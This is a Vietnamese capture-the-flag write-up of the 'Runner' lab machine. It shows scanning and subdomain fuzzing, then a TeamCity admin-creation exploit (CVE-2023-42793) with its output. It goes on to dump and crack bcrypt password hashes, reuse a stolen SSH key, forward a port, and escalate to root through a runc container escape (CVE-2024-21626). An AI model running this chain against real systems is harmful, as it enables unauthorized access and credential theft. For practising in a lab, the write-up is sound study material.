# Runner

<img width="1411" height="632" alt="image" src="https://github.com/user-attachments/assets/a16be864-5bad-4bfc-b06b-5d6c5f04650b" />

Đầu tiên thì tôi scan được 3 port:

```
❯ sudo nmap -sV -p- 10.10.11.13
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-25 23:58 +0700
Nmap scan report for runner.htb (10.10.11.13)
Host is up (0.77s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.45 seconds
```

Truy cập thì trang web có giao diện như này:

<img width="1853" height="906" alt="image" src="https://github.com/user-attachments/assets/3e312bb6-bca9-4c46-8d73-acf967e1a026" />

Tiếp tục thì tôi fuzzing subdomain và tìm được `teamcity`:

```
❯ ffuf -u http://10.10.11.13/ -H 'Host: FUZZ.runner.htb' -w ~/wordlist/SecLists/Discovery/DNS/namelist.txt | grep -v "Size: 154, Words: 4, Lines: 8"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.13/
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/SecLists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 48ms]
:: Progress: [151265/151265] :: Job [1/1] :: 1111 req/sec :: Duration: [0:03:46] :: Errors: 0 ::
```

Và đây là giao diện của website:

<img width="1851" height="837" alt="image" src="https://github.com/user-attachments/assets/99f397d9-95e2-4b5e-a216-d18628723e3a" />

Tôi search được cái [CVE-2023-42793](https://github.com/B4l3rI0n/CVE-2023-42793) và chạy thử:

```
┌──(py_envs)─(kali㉿kali)-[~/CVE-2023-42793]
└─$ python3 exploit.py -u http://teamcity.runner.htb/

=====================================================
*                                                   *
*              CVE-2023-42793                       *
*        TeamCity Admin Account Creation            *
*                                                   *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.SjRPTzQyaUtseVd5czl6N0VUa2FfNDRSNFRB.YWNiZDYwZTgtZmRmYy00NzU0LTk5YzktNjI1M2YwZTU5YWMy
Token saved to ./token
Successfully exploited!
URL: http://teamcity.runner.htb/
Username: admin.pKlI
Password: Password@123
```

Tạo được tài khoản và mật khẩu của `TeamCity` và truy cập được vào dashboard:

<img width="1857" height="725" alt="image" src="https://github.com/user-attachments/assets/690f592d-9fc6-4311-ac7a-7e79ac5f2bbf" />

Trong trang web còn có tính năng backup:

<img width="1705" height="884" alt="image" src="https://github.com/user-attachments/assets/5643d6c2-8b19-4533-9784-a5d002dba079" />

Sau khi unzip thì ra được các file như sau:

```
❯ ls -la
drwxr-xr-x   - namdeptrai 26 Sep 00:53  .
drwxr-xr-x   - namdeptrai 26 Sep 00:53  ..
.---------   6 namdeptrai 25 Sep 17:25 󰡯 charset
drwxr-xr-x   - namdeptrai 26 Sep 00:53  config
drwxr-xr-x   - namdeptrai 26 Sep 00:53  database_dump
.--------- 630 namdeptrai 25 Sep 17:25  export.report
drwxr-xr-x   - namdeptrai 26 Sep 00:53  metadata
drwxr-xr-x   - namdeptrai 26 Sep 00:53  system
.---------  92 namdeptrai 25 Sep 17:25  version.txt
```

Tôi tìm được hash của mật khẩu bao gồm admin và matthew:

```
❯ cd database_dump
❯ ls
󰡯 action_history           󰡯 db_version          󰡯 project_mapping        󰡯 user_projects_visibility       󰡯 users
󰡯 agent_pool               󰡯 domain_sequence     󰡯 remember_me            󰡯 user_property                  󰡯 vcs_root
󰡯 agent_pool_project       󰡯 hidden_health_item  󰡯 server                 󰡯 user_roles                     󰡯 vcs_root_mapping
󰡯 audit_additional_object  󰡯 meta_file_line      󰡯 server_health_items    󰡯 usergroup_notification_data    󰡯 vcs_username
󰡯 backup_info              󰡯 node_locks          󰡯 server_property        󰡯 usergroup_notification_events
󰡯 build_queue_order        󰡯 node_tasks          󰡯 server_statistics      󰡯 usergroup_roles
󰡯 comments                 󰡯 permanent_tokens    󰡯 single_row             󰡯 usergroup_watch_type
󰡯 config_persisting_tasks  󰡯 project             󰡯 stats_publisher_state  󰡯 usergroups
❯ cat users
cat: users: Permission denied
❯ chmod +r users
❯ cat users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1758820746773, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, admin.9tww, $2a$07$vOfH367O2rSBivLQbswuzOwD1OafgwSn3ZLGFERXV/.L4L/1xrE9i, , admin.9tww@lol.omg, 1758819480230, BCRYPT
12, admin.zb5k, $2a$07$EgQqxUuFa456nh/nd/QH2ubVEGnGJ0Km9Ve8009rTshnZ045MxsUW, , admin.ZB5K@lol.omg, , BCRYPT
13, admin.pkli, $2a$07$Tph/5jSNNOSbeagvUmnL5ujnfZ8.6DaaP2JhFRHcVSTOBG3NbSDk6, , admin.pKlI@lol.omg, 1758820838249, BCRYPT
```

Sau 1 lúc crack thì tôi ra được mật khẩu của `matthew` là `piper123`:

<img width="1110" height="898" alt="image" src="https://github.com/user-attachments/assets/a9708b25-f8d3-4d93-8ec5-1f8b2496bf6b" />

Có vẻ như cred của user matthew không ssh vào được:

```
❯ ssh matthew@10.10.11.13
matthew@10.10.11.13's password: 
Permission denied, please try again.
```

Tiếp tục thì chạy đoạn exploit kia để rce xem thử có gì:

<img width="1355" height="344" alt="image" src="https://github.com/user-attachments/assets/f482da8e-d2cf-4a91-b24a-f835b2eb4877" />

Ngồi tìm kiếm thì tôi tìm được key ssh:

```
$ pwd
/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys
$ ls -la
total 12
drwxr-x--- 2 tcuser tcuser 4096 Feb 28  2024 .
drwxr-x--- 3 tcuser tcuser 4096 Feb 28  2024 ..
-rw-r----- 1 tcuser tcuser 2590 Feb 28  2024 id_rsa
$ whoami
tcuser
```

Tôi tải về và sử dụng lệnh để check xem key này thuộc về user nào và nó thuộc về john:

```
❯ cat id_rsa | grep -v '\-\-'|base64 -d | xxd | tail -2
grep: warning: stray \ before -
00000730: c73d cf67 9c81 9b00 0000 0b6a 6f68 6e40  .=.g.......john@
00000740: 7275 6e6e 6572                           runner
```

Sau khi ssh vào được thì tôi check các port đang mở, thấy được có port 9000 là đang có 1 website trên đó:

```
john@runner:~$ cat user.txt 
812d57df7bd0c2eb8654a5d382be7939
john@runner:~$ ss -tnlp
State           Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process          
LISTEN          0                4096                           127.0.0.1:8111                          0.0.0.0:*                              
LISTEN          0                511                              0.0.0.0:80                            0.0.0.0:*                              
LISTEN          0                128                              0.0.0.0:22                            0.0.0.0:*                              
LISTEN          0                4096                           127.0.0.1:9443                          0.0.0.0:*                              
LISTEN          0                4096                           127.0.0.1:5005                          0.0.0.0:*                              
LISTEN          0                4096                           127.0.0.1:9000                          0.0.0.0:*                              
LISTEN          0                4096                       127.0.0.53%lo:53                            0.0.0.0:*                              
LISTEN          0                511                                 [::]:80                               [::]:*                              
LISTEN          0                128                                 [::]:22                               [::]:*                              
LISTEN          0                4096                                   *:8000                                *:*                              
```

Tôi nối port đó ra ngoài máy của tôi `ssh -L 9000:localhost:9000 john@10.10.11.13 -i id_rsa` và xem được trang web:

<img width="1863" height="764" alt="image" src="https://github.com/user-attachments/assets/0e2124a8-db10-4542-8978-ec834495d3bd" />

Thử với cred của matthew thì vào được, do biết version là `2.19.4` và tìm được 1 số CVE liên quan nhưng không có ích lắm.

Và tôi tìm được thêm cái nữa là:

```
john@runner:~$ runc --version
runc version 1.1.7-0ubuntu1~22.04.1
spec: 1.0.2-dev
go: go1.18.1
libseccomp: 2.5.3
```

Search google thì có cách khai thác [CVE-2024-21626](https://github.com/NitroCao/CVE-2024-21626?tab=readme-ov-file) và giải thích rõ 
[CVE-2024-21626](https://nitroc.org/en/posts/cve-2024-21626-illustrated/), tôi tạo container với setup như này:

<img width="1808" height="865" alt="image" src="https://github.com/user-attachments/assets/bb540b2d-e79c-41e8-b684-2c0dcfb81f64" />

Sau đó connect vào container với `/bin/sh` và lúc này tôi đang có quyền root:

<img width="1818" height="802" alt="image" src="https://github.com/user-attachments/assets/178a19e7-139f-438e-94f0-0e08af67e9f5" />
